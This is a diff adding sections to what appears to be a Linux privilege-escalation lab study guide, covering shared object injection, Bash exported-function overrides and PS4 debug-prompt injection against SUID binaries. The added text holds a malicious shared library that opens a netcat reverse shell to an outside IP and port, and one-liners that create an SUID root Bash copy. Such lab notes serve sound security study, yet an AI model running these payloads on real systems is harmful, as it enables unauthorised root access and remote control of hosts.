@@ -579,7 +579,7 @@ However, don't assume:
 writable file = privilege escalation
 ```
 
-You need to ask:
+You need to adsk:
 ```text
 Who owns it?
 Who executes it?
@@ -717,6 +717,336 @@ The `x` means the actual password hash is stored in `/etc/shadow`.
 
 ---
 
+# Shared Object Injection
+
+### What is a Shared Object?
+A **shared object** is a dynamically linked library used by Linux programs.
+
+Shared libraries normally have the `.so` extension.
+
+Examples:
+
+```text
+libc.so
+libssl.so
+libcrypto.so
+```
+
+Programs can load shared objects at runtime instead of having all functionality compiled directly into the executable.
+
+## Shared Object Injection
+**Shared object injection** occurs when a privileged executable loads a library from a location that an attacker can control.
+
+If the vulnerable program runs with **SUID**, the injected shared object may execute with the privileges of the executable.
+
+### Attack Scenario
+```text
+SUID executable
+       ↓
+Loads shared object
+       ↓
+/home/user/.config/libcalc.so
+       ↓
+Attacker controls this location
+       ↓
+Malicious libcalc.so
+       ↓
+Code executes with SUID privileges
+       ↓
+Root shell
+```
+
+## Identifying the Vulnerability
+
+The vulnerable executable is:
+```bash
+/usr/local/bin/suid-so
+```
+
+Run it normally:
+```bash
+/usr/local/bin/suid-so
+```
+
+Initially, it displays a progress bar and exits.
+
+To investigate what files the program accesses, use `strace`:
+```bash
+strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
+```
+
+`strace` allows us to observe system calls made by a program.
+
+The important finding is that the executable attempts to load:
+```text
+/home/user/.config/libcalc.so
+```
+but the file does not exist.
+This is significant because the path is inside the user's home directory.
+
+## Why the Location Matters
+The executable is **SUID**, meaning it executes with the privileges of its file owner.
+
+If the owner is `root`, execution can effectively occur with root privileges.
+
+If a root-owned SUID program loads a library from a directory writable by a normal user:
+
+```text
+Root SUID program
+       ↓
+Loads library
+       ↓
+User-controlled path
+       ↓
+Malicious library
+       ↓
+Code executes with elevated privileges
+```
+This creates a **privilege-escalation opportunity**.
+
+## Exploitation
+
+First create the directory expected by the executable:
+```bash
+mkdir /home/user/.config
+```
+
+A sample shared-object
+```C
+#include <stdio.h>  
+#include <stdlib.h>  
+  
+static void func() __attribute__ ((constructor));  
+  
+static void func() {  
+   setuid(0); // 0 uid is for root  
+   system("nc -e /bin/bash 10.17.33.221 4444");  //my ip and port
+}
+```
+
+at:
+```text
+/home/user/tools/suid/libcalc.c
+```
+
+The source contains code that spawns a Bash reverese shell.
+
+Compile it as a shared object:
+```bash
+gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
+```
+
+### Important GCC Options
+
+|Option|Purpose|
+|---|---|
+|`-shared`|Create a shared library instead of a normal executable|
+|`-fPIC`|Generate Position Independent Code|
+|`-o`|Specify the output file|
+
+The resulting file is:
+```text
+/home/user/.config/libcalc.so
+```
+
+Now execute the SUID program again:
+```bash
+/usr/local/bin/suid-so
+```
+
+Instead of the original progress bar, the program loads the attacker-controlled shared object.
+
+Because the vulnerable executable is SUID, the injected code executes with its elevated privileges, resulting in a **root shell** in the lab.
+
+## Important Concept
+The vulnerability exists because **a privileged SUID program trusts a shared library located in an attacker-controlled directory**.
+
+The dangerous combination is:
+```text
+SUID
++
+Dynamic Library Loading
++
+Attacker-Controlled Library Path
+=
+Potential Privilege Escalation
+```
+
+### Key Takeaway
+
+> **A SUID binary becomes dangerous when it dynamically loads a shared object from a location that an unprivileged user can control.**
+
+
+---
+
+# Abusing Shell Features
+
+**Shell feature abuse** is a privilege-escalation technique where a privileged program interacts with shell functionality in an unsafe way.
+
+Unlike PATH hijacking, these attacks can work **even when the program uses an absolute path**, because the attacker abuses features of the shell itself.
+
+## 1. Bash Function Name Injection
+
+### Vulnerable Binary
+
+The target is:
+```bash
+/usr/local/bin/suid-env2
+```
+
+It is similar to `suid-env`, but it uses the absolute path:
+```text
+/usr/sbin/service
+```
+
+Verify this with:
+```bash
+strings /usr/local/bin/suid-env2
+```
+
+the output:
+```text
+/usr/sbin/service
+```
+to another executable.
+
+### Bash Function Import Vulnerability
+
+Older versions of Bash had a feature that allowed exported shell functions to have names resembling filesystem paths.
+
+This can be abused to override a command even when the program specifies an absolute path.
+
+The relevant vulnerable Bash versions are:
+```text
+Bash < 4.2-048
+```
+
+Check the Bash version:
+```bash
+/bin/bash --version
+```
+
+### Create the Malicious Function
+
+Create a function named exactly like the executable being called:
+```bash
+function /usr/sbin/service { /bin/bash -p; }
+```
+
+The function executes:
+```bash
+/bin/bash -p
+```
+The `-p` option tells Bash to preserve the effective privileges instead of dropping them.
+
+Export the function:
+```bash
+export -f /usr/sbin/service
+```
+
+Now execute:
+```bash
+/usr/local/bin/suid-env2
+```
+
+In the vulnerable Bash environment, the exported function can take precedence over the actual `/usr/sbin/service` executable.
+
+Because `suid-env2` is **SUID**, the resulting Bash process can retain elevated privileges.
+
+### Attack Chain
+```text
+SUID program
+     ↓
+Calls /usr/sbin/service
+     ↓
+Absolute path prevents PATH hijacking
+     ↓
+Old Bash imports exported function
+     ↓
+Function named /usr/sbin/service
+     ↓
+Function executes /bin/bash -p
+     ↓
+Elevated shell
+```
+
+### Important Point
+> **Absolute paths protect against traditional PATH hijacking, but they do not necessarily protect against vulnerabilities in the shell used to execute the command.**
+
+---
+
+# 2d. Bash Debugging + PS4 Injection
+
+Another shell-feature abuse technique involves Bash's **debugging mode** and the `PS4` environment variable.
+
+**NOTE** --> This will not work on Bash versions 4.4 and above
+### What is PS4?
+`PS4` controls the prompt displayed by Bash when command tracing/debugging is enabled.
+
+For example, with:
+```bash
+set -x
+```
+Bash prints commands before executing them.
+`PS4` controls the text displayed before those commands.
+
+## Why PS4 Can Be Dangerous
+
+In vulnerable Bash versions, an attacker may be able to place a command substitution inside `PS4`:
+```bash
+PS4='$(command)'
+```
+
+When Bash performs debugging/tracing, the command substitution can be evaluated.
+
+This creates a situation where an attacker-controlled environment variable can cause arbitrary command execution.
+
+###  Exploitation
+```bash
+env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
+```
+
+Breakdown:
+
+|Component|Purpose|
+|---|---|
+|`env -i`|Starts with a mostly empty environment|
+|`SHELLOPTS=xtrace`|Enables Bash execution tracing|
+|`PS4=...`|Defines the debug prompt|
+|`$(...)`|Command substitution|
+|`cp /bin/bash /tmp/rootbash`|Creates a copy of Bash|
+|`chmod +xs /tmp/rootbash`|Gives the copy SUID permissions|
+|`suid-env2`|Executes the vulnerable SUID program|
+in that command, the `PS4` environment variable is passed specifically to `/usr/local/bin/suid-env2` and the processes it launches/inherits it from.
+
+The payload effectively creates:
+```text
+/tmp/rootbash
+```
+as an SUID copy of Bash.
+
+### Execute the SUID Bash
+
+After the vulnerable program has executed:
+```bash
+/tmp/rootbash -p
+```
+
+## Cleanup
+
+Remove the SUID Bash copy:
+```bash
+rm /tmp/rootbash
+```
+
+Then exit the elevated shell:
+```bash
+exit
+```
+
+Cleanup is important because `/tmp/rootbash` remains an SUID executable until removed.
+
+---
 # 21. Finding Interesting Writable System Files
 
 A useful command:
